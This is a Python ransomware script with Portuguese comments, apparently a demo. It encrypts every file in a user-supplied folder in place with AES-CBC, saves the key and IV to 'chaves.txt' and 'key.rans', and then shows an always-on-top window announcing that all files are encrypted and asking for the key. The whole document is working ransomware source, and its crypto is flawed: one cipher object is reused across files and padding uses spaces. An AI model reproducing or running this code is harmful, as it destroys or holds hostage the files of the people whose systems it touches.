import os
import secrets
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
import tkinter as tk
from decriptar import descriptografar
import shutil

# Gera uma chave AES de 256 bits (32 bytes)
key = secrets.token_bytes(32)
# Vetor de inicialização (IV) - deve ser diferente para cada arquivo
iv = get_random_bytes(16)

caminho_chave_txt = os.path.join(os.getcwd(), "chaves.txt")
with open(caminho_chave_txt, "w") as f:
    f.write(key.hex() + iv.hex())

# Salvar chave e IV no arquivo 'key.rans'
with open('key.rans', 'wb') as arquivo:
    arquivo.write((key.hex() + iv.hex()).encode())

def mover_key(caminho_pasta):
    # Caminho do arquivo que você deseja mover
    caminho_arquivo_origem = os.path.join(os.getcwd(), "key.rans")
    # Caminho de destino, onde o arquivo será movido
    caminho_arquivo_destino = os.path.join(caminho_pasta, "key.rans")
    # Verifica se o arquivo existe
    if os.path.exists(caminho_arquivo_origem):
        # Mover o arquivo
        shutil.move(caminho_arquivo_origem, caminho_arquivo_destino)

def show_encryption_message():
    def decrypt_files():
        chave_hex = entry.get()
        descriptografar(caminho_pasta, chave_hex)
        root.destroy()

    root = tk.Tk()
    root.attributes('-topmost', True)

    message_label = tk.Label(root, text="Todos os seus arquivos foram criptografados!\nPara resgatá-los, insira a chave para descriptografar:")
    message_label.pack(pady=20)

    entry = tk.Entry(root, width=100)
    entry.pack(pady=20)

    decrypt_button = tk.Button(root, text="Descriptografar", command=decrypt_files)
    decrypt_button.pack(pady=20)

    root.mainloop()


# Pasta que você deseja criptografar
caminho_pasta = input("Digite o caminho da pasta que deseja criptografar:")

# Listar todos os arquivos na pasta
arquivos = os.listdir(caminho_pasta)

# Inicializar o objeto AES
cipher = AES.new(key, AES.MODE_CBC, iv)

# Iterar sobre os arquivos e criptografá-los
for arquivo in arquivos:
    if os.path.isfile(os.path.join(caminho_pasta, arquivo)):
        with open(os.path.join(caminho_pasta, arquivo), 'rb') as arquivo_original:
            dados = arquivo_original.read()
            dados = dados + b' ' * (16 - len(dados) % 16)
            dados_criptografados = cipher.encrypt(dados)
        with open(os.path.join(caminho_pasta, arquivo), 'wb') as arquivo_criptografado:
            arquivo_criptografado.write(dados_criptografados)

# Move o arquivo Key.rans para a pasta onde os arquivos encriptados estão salvos
mover_key(caminho_pasta)

# Apresenta mensagem para usuário que arquivos foram encriptados e solicita a chave para decriptar
show_encryption_message()

